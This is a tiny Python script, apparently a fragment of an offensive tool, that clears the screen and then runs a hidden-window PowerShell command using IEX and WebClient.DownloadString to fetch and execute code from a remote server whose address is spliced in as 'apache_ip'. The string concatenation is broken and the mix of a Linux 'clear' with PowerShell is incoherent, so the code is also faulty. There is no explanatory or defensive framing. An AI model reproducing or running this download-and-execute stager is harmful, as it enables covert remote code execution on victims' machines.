import os 


def clearScr():
    os.system('clear')
    
clearScr()
os.system('powershell -noexit -windowstyle hidden -c IEX(New-Object System.Net.WebClient).DownloadString(\'http://"+ apache_ip +"/*\'))












